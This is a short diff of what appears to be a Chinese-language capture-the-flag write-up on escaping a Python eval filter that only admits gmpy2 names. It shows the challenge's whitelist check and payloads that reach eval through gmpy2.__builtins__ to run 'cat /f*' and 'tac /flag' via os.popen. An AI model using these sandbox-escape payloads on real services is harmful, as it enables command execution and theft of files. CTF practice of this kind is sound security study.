@@ -24,6 +24,11 @@ eval(__import__('os').popen('cat /f*').read());
 eval(code)
 要求code存在gmpy2数组中
 ```
+for item in pattern.findall(code):#从code里把单词拿出来 
+if not re.match(r'\d+$',item):#如果不是数字 
+if item not in dir(gmpy2):#逐个和gmpy2库里的函数名比较
+```
+```
 知道gmpy2以下可以命令执行：
 gmpy2.__builtins__['eval']("__import__('os').popen('tac /flag').read()")
 
